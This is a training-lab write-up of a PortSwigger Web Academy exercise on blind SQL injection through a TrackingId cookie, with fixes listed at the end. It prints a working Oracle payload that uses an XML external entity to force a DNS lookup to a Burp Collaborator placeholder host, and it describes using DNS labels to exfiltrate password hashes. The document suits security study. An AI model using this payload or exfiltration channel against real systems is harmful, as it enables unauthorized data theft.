# #Description

Lab: SQL injection - Blind SQL injection with out-of-band interaction</br>

Platform: PortSwigger Web Academy</br>

Difficulty: Practitioner</br>

Date Completed: 25 July 2026</br>

# #What was vulnerable:

The `TrackingId` cookie was vulnerable to a blind SQL injection where the application gave no observable difference in its response — no error, no content change, and no reliable timing difference either. The only way to confirm and exploit the injection was to make the database itself trigger an out-of-band network interaction (DNS) to a server under my control.

# #Prerequisites

1. Understanding of blind SQLi with conditional responses and time delays
2. Oracle-specific syntax  `UTL_INADDR.get_host_address()`, `EXTRACTVALUE()`, XML external entity (XXE)-style DNS triggering.
3. Familiarity with Burp Collaborator client for generating and polling unique interaction subdomains.
4. Understanding that OOB techniques apply when there is no visible or timing-based feedback channel available in the HTTP response itself.

# #What I did:

1. Intercepted the request in Burp Suite and identified the `TrackingId` cookie as the injection point.
2. Generated a unique payload subdomain using the Burp Collaborator client (Burp → Collaborator tab → Copy to clipboard).
3. Injected the following payload into the `TrackingId` cookie:`' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--`
This forces Oracle to parse an external XML entity, which makes it resolve the hostname pointing to my Collaborator subdomain an out-of-band DNS lookup.
4. Sent the request, then returned to the Collaborator client and clicked **Poll now**.
5. Observed a DNS interaction logged against my unique subdomain, confirming the injection executed successfully on the backend even though the HTTP response gave no visible indication of it. This confirmed the vulnerability and completed the lab.

# #Why it worked:

The cookie value was concatenated directly into a SQL query without sanitization or parameterization. Because the application returned identical responses regardless of query outcome, in-band detection methods (error-based, boolean-based, time-based) weren't viable signals here. Oracle's `UTL_INADDR`/XML entity parsing lets a SQL query trigger a DNS resolution as a side effect, so I used the database's own outbound network request as the feedback channel — Burp Collaborator acts as the listening server that logs any DNS, HTTP, or SMTP interaction against a unique, attacker-generated subdomain, correlating it back to the specific payload sent. A logged interaction is proof of execution independent of anything the application returns in-band.

# #Impact:

An attacker can confirm and exploit a SQL injection vulnerability even when the application provides zero visible feedback, and can extend the same channel to exfiltrate data by encoding query results (e.g., a password hash) as a subdomain label in the DNS lookup itself, reading the data directly off the interaction log.

# #Fix:

1. Use parameterized queries - This forces the database to view user input only as data and not executable SQL code.
2. Validate input - Use of whitelists to only allow specific inputs to be given in the parameters
3. **Disable unnecessary XML/network-capable functions** (e.g., XXE parsing, `UTL_INADDR`, `UTL_HTTP`) at the database level unless explicitly required.

# #Screenshot:
<img width="1626" height="212" alt="image" src="https://github.com/user-attachments/assets/baf0f00a-53c3-4405-b130-bba9c1dfda41" />
